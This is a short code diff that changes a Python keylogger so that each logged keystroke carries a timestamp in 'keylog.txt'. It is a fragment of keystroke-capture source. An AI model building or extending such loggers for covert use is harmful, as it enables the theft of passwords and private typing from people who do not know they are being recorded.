@@ -5,7 +5,8 @@ log_file = "keylog.txt"
 
 def write_to_file(key):
     with open(log_file, "a") as file:
-        file.write(str(key) + " ")
+        timestamp = time.strftime("%H:%M:%S")
+        file.write(f"{timestamp} - {key} ")
 
 def on_press(key):
     try:
